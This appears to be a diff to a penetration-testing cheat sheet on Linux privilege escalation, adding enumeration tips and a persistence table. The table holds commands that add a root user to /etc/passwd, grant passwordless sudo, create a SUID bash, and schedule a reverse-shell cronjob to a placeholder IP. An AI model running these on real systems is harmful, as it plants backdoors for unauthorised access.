@@ -94,10 +94,15 @@ layout: default
 
     <li>If web page is running under the context of higher privilege user, try to create a web shell</li>
 
-    <li>Check network services (netstat -tulpn)</li>
+    <li>Check network services</li>
     <ul>
         <li>Look for open ports/running services that didn't show during port scan</li>
-        <li>Forward internally listening ports to attacking machine</li>
+        <ul>
+            <li>netstat -tulpn</li>
+            <li>Forward internally listening ports to attacking machine</li>
+        </ul>
+        <li>Check for port knocking configurations</li>
+        <li>/etc/knockd.conf</li>
     </ul>
 
     <li>Check for interesting programs</li>
@@ -171,6 +176,10 @@ layout: default
     <ul>
         <li>New way to do cronjob on services</li>
         <li>systemctl list-timers</li>
+    </ul>
+    <li>Check for processes running in the background</li>
+    <ul>
+        <li>pspy</li>
     </ul>
 
     <h2>Shell upgrade & Enumeration</h2>
@@ -471,6 +480,37 @@ int main() {
         <li>Rooted</li>
     </ul>
 
+    <li>Persistence Methods</li>
+    <table>
+        <tr>
+            <td>Add new root to /etc/passwd</td>
+            <td>
+                <li>echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd</li>
+                    <table>
+                        <tr>
+                            <td>Generate new password hash</td>
+                            <td>openssl passwd &lt;password&gt;</td>
+                        </tr>
+                    </table>
+                <li>su root2</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Add user to /etc/sudoers</td>
+            <td>echo &quot;&lt;user&gt;                  ALL=(ALL:ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers</td>
+        </tr>
+        <tr>
+            <td>SUID Bash</td>
+            <td>
+                <li>cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash</li>
+                <li>./rootbash -p</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Malicious Cronjob</td>
+            <td>echo &quot;* * * * * root /bin/bash -c &#039;bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/&lt;port #&gt; 0&gt;&amp;1&#039; &quot;</td>
+        </tr>
+    </table>
 
 </body>
 </html>
